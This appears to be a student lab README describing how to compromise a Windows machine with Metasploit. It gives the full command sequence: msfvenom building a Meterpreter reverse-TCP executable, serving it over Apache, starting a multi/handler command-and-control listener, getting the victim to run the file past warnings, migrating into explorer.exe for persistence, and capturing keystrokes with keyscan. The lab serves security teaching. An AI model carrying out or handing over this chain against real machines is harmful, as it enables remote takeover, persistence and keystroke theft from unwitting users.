# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/a747cd77-3129-4c70-b04f-bef68aeb7fd8)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/c86e3801-58d7-4dea-810d-f92152f0f0fe)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/724ef163-3e79-4a63-9eb5-32c1421c7019)

Start apache server sudo systemctl apache2 start

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/4e39034a-910b-4b59-870d-da07a665443b)

Check the status of apache2

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/6ba32ffc-8377-498e-8a24-910c2537f897)

Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/151c5d1d-3478-43f9-beb3-a7e290681123)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/5f5b37be-1fea-4e45-b142-4c927d2306de)

Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/586d2cab-ad6f-4135-b92c-72e2d7b95225)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/726bcdbe-f11e-4518-8b50-f257cc1a73e5)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/2424fae4-0a9f-40e3-8055-ac1d6b421911)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Hariharan-061102/Compromising-windows-using-Metasploit/assets/93427270/0bdaef8b-97ef-4ff1-bbfd-14df920d0ee9)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
